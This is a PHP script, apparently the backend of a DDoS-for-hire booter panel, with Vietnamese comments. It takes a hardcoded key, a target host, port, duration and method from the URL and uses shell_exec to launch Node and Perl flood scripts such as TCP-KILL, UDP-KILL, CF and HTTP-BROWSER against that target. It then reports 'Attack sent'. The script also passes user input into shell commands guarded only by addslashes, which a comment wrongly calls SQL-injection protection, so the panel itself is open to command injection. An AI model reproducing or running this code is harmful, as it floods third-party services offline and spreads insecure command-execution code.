<?php
// Coded by Sword

// Kiểm tra xem có lỗi khi lấy dữ liệu từ query string không
function checkInput($input) {
    return isset($_GET[$input]) ? $_GET[$input] : null;
}

$key = checkInput('key');
$host = checkInput('host');
$port = checkInput('port');
$time = checkInput('time');
$method = checkInput('method');

// Sử dụng hàm addslashes để tránh SQL injection khi sử dụng biến trong shell_exec
$host = addslashes($host);
$port = addslashes($port);
$time = addslashes($time);
$method = addslashes($method);

if ($key == "huy") {
    if ($host == null) { echo "Please enter a host"; }
    elseif ($port == null) { echo "Please enter a port"; }
    elseif ($time == null) { echo "Please enter a time"; }
    elseif ($method == null) { echo "Please enter a method"; }
    else {
        if ($method == "HTTP-SOCKETS") {
            shell_exec("node HTTP-SOCKETS.js $host 50 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "CF") { 
            shell_exec("node cf.js $host $time 10");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "HTTP-RAW") { 
            shell_exec("node HTTP-RAW.js $host $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "HTTP-BROWSER") { 
            shell_exec("node HTTP-BROWSER.js $host 50 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "DESTROY") { 
            shell_exec("perl destroy.pl $host $port 64 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "GOD") { 
            shell_exec("perl god.pl $host $port 64 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "TCP-KILL") { 
            shell_exec("node TCP-KILL.js byte $host:$port $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        elseif ($method == "UDP-KILL") { 
            shell_exec("perl UDP-KILL.pl $host $port 64 $time");
            echo "Attack sent on $host with the port $port for $time s with $method method.";
        }
        else {
            echo "Invalid method!";
        }
    }
}
else { 
    echo "Key invalid !";
}
?>
